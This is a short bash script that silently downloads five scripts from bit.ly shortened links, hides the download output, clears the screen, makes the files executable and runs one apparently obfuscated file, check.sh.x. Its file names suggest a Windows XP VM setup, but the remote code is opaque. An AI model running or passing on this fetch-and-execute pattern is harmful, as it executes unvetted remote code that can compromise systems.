#!/bin/bash
ssh node01
wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
clear
wget -O sleep.sh https://bit.ly/3zzuJJh > /dev/null 2>&1
clear
wget -O winxpvm.sh https://bit.ly/3BNeNFj > /dev/null 2>&1
clear
wget -O check.sh.x https://bit.ly/3i8Tdn9 > /dev/null 2>&1
clear
wget -O region.sh https://bit.ly/3l6SmFa > /dev/null 2>&1
chmod +x winxpvm.sh
chmod +x exit.sh
chmod +x sleep.sh
chmod +x region.sh
chmod +x check.sh.x
./check.sh.x
